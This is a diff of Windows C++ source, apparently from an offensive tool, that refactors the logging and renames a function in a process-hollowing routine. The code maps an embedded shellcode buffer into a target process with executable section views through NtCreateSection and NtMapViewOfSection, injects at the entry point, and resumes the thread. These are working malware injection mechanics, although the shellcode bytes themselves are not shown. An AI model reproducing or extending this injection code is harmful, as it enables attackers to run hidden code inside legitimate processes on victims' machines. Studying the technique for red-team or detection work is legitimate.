@@ -7,7 +7,7 @@
 
 bool hk_local::hollowTarget(DWORD PID) noexcept {
   if (!PID) {
-    LOG("ERROR: Invalid process ID. Either the process is not running or "
+    LOG(logError, "Invalid process ID. Either the process is not running or "
         "couldn't be detected.");
     return false;
   }
@@ -42,17 +42,16 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
   hkProcess targetProc(processPath);
   hkShellCode shellCode(hk_util::shellCode, hk_util::shellCodeSize);
 
-  if (!(pTgtSectionView = mapCode(&targetProc, &shellCode))) {
-    LOG("ERROR: Shell code injection failed. Error code:" << GetLastError());
+  if (!(pTgtSectionView = mapShellCodeIntoTargetProcess(&targetProc, &shellCode))) {
+    LOG(logError, "Shell code injection failed. Error code: %d", GetLastError());
         return false;
   }
 
   injectAtEntry(&targetProc, &pTgtSectionView);
 
   if(targetProc.resetContext()) {
-    LOG("WARNING: Failed to properly restore context for the target process "
-        "thread. Error Code: "
-        << GetLastError());
+    LOG(logWarning, "Failed to properly restore context for the target process thread. Error Code: %d",
+        GetLastError());
   };
   ResumeThread(targetProc.hThread);
 
@@ -64,7 +63,7 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
   return true;
 }
 
-void* hk_local::mapCode(hkProcess* pTarget, hkShellCode* pCode) noexcept {
+void* hk_local::mapShellCodeIntoTargetProcess(hkProcess* pTarget, hkShellCode* pCode) noexcept {
   
   HANDLE hSection = NULL;
   LARGE_INTEGER sectionSize{};
@@ -76,33 +75,31 @@ void* hk_local::mapCode(hkProcess* pTarget, hkShellCode* pCode) noexcept {
   TMapViewOfSection hkMapViewOfSection =
       (TMapViewOfSection)hk_util::procAddr("ntdll", "NtMapViewOfSection");
 
-  LOG("Creating section at 0x" << std::hex << hkCreateSection << ", size "
-                               << std::dec << sectionSize.QuadPart);
+  LOG(logOK, "Creating section at 0x%x, size %d.", hkCreateSection, sectionSize.QuadPart);
   hkCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize,
                   PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 
-  LOG("Mapping local section view...");
+  LOG(logOK, "Mapping local section view...");
   hkMapViewOfSection(hSection, GetCurrentProcess(), &lpSectionLocal, NULL, NULL,
                      NULL, &pCode->size, 2, NULL, PAGE_READWRITE);
-  LOG("Mapped local section view at 0x" << std::hex << lpSectionLocal);
+  LOG(logOK, "Mapped local section view at 0x%x", lpSectionLocal);
 
-  LOG("Mapping target section view for PID " << std::dec << pTarget->dwProcessId
-                                             << "...");
+  LOG(logOK, "Mapping target section view for PID %d...", pTarget->dwProcessId);
+
   if (hkMapViewOfSection(hSection, pTarget->hProcess, &lpSectionTarget,
                          NULL, NULL, NULL, &pCode->size, 2, NULL,
                          PAGE_EXECUTE_READ) != 0) {
-    LOG("ERROR: failed to map target section view. Error code: "
-        << GetLastError());
+    LOG(logError, "Failed to map target section view. Error code: %d", GetLastError());
     return nullptr;
   };
 
-  LOG("Mapped target section view at 0x" << std::hex << lpSectionTarget);
+  LOG(logOK, "Mapped target section view at 0x%x", lpSectionTarget);
 
-  LOGn("Copying shellcode to the new section...\t\t");
+  LOGn(logOK, "Copying shellcode to the new section...\t\t");
 
   memcpy(lpSectionLocal, pCode->pData, pCode->size);
 
-  LOG("SUCCESS.\n");
+  LOG(logOK, "SUCCESS.\n");
 
   CloseHandle(hSection);
 
